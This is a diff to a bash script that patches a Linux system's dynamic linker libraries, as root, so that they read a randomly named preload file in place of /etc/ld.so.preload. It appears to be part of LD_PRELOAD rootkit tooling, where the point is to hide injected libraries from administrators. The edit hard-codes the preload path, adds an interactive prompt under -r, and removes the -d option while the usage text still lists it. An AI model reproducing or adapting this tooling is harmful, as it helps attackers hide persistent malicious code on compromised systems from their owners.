@@ -14,6 +14,11 @@ script_root="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
 source $script_root/util.sh
 source $script_root/random.sh
 
+# preload file location.
+# if using this script with the -r flag, change this variable
+# to wherever you would like the preload file to live.
+O_PRELOAD="/etc/ld.so.preload"
+
 get_ld_libs(){
     local lib_dir
     for current_dir in ${LIB_DIRS[@]}; do
@@ -21,18 +26,6 @@ get_ld_libs(){
         lib_dir="${current_dir}*" # /DIRECTORY/*
         for file in ${lib_dir[@]}; do [[ "`basename $file`" == "ld-"*".so"* ]] && LD_LIBS+=($file); done
     done
-}
-
-find_preload_location(){
-    local strings_output lib
-    [ -z ${LD_LIBS[0]} ] && get_ld_libs
-    lib=${LD_LIBS[0]}
-    strings_cmd="strings -d"
-    if grep -Eqi "CentOS release 6" /etc/issue || grep -Eq "CentOS release 6" /etc/*-release; then
-        strings_cmd="strings"
-    fi
-    strings_output="$($strings_cmd $lib | grep '/' | tail -n 1)"
-    echo -n $strings_output
 }
 
 # builds new location string for the preload file.
@@ -58,11 +51,12 @@ patch_lib(){ # $1 = target lib, $2 = old preload file, $3 = new preload file
 # be used for reverting the path back to /etc/ld.so.preload.
 patch_dynamic_linker(){
     local new_preload old_preload
-    old_preload=$(find_preload_location)
-    [ ! -z "$1" ] && new_preload="$1"
+    old_preload="$O_PRELOAD"
+    [ ! -z "$1" ] && old_preload="$1"  # allows use of -r to manually patch the current
+    [ ! -z "$2" ] && new_preload="$2"  # preload file to $2
     [ ! -z "$new_preload" ] && [ -f "$new_preload" ] && rm -f "$new_preload"
 
-    while [ -f $new_preload ] || [ -d $new_preload ] || [ -z $new_preload ]; do
+    while [ -z $new_preload ]; do
         new_preload="`get_new_preload`" # generate new preload file location
 
         # the new file location has got to be the same length as the previous
@@ -81,9 +75,11 @@ USAGE="
             Output the new preload file location when finished patching.
             (without a trailing newline)
          -p:
-            Fully patch all dynamic linker libs on this system. (REQUIRES ROOT)
+            Fully patch all dynamic linker libs on this system  (REQUIRES ROOT)
+            using the randomly generated preload file path.
          -r:
-            Revert the preload file location back to /etc/ld.so.preload. (REQUIRES ROOT) 
+            Patch the dynamic linker to \$O_PRELOAD before asking  (REQUIRES ROOT)
+            for the current file path.
          -d:
             Find & output all dynamic linker libraries on this system.
 "
@@ -103,19 +99,12 @@ while getopts "?oprd" opt; do
         exit
         ;;
     r)
-        [ $(id -u) != 0 ] && { eecho "Root is required to revert the dynamic linker, exiting" && exit; }
+        [ $(id -u) != 0 ] && { eecho "Root is required to patch the dynamic linker libs, exiting" && exit; }
 
-        necho "Reverting the preload file back to default '/etc/ld.so.preload'"
-        patch_dynamic_linker /etc/ld.so.preload
-        exit
-        ;;
-    d)
-        necho "Getting all lib locations"
-        get_ld_libs
-        for lib in ${LD_LIBS[@]}; do
-            secho "Location: $lib"
-            secho "Preload location: $(find_preload_location)"
-        done
+        necho "Patching preload file to '$O_PRELOAD'"
+        read -p "Enter the path of the current preload file: "
+        [ -z "$REPLY" ] && { echo "No path given. Exiting."; exit; }
+        patch_dynamic_linker $REPLY $O_PRELOAD
         exit
         ;;
     ?)
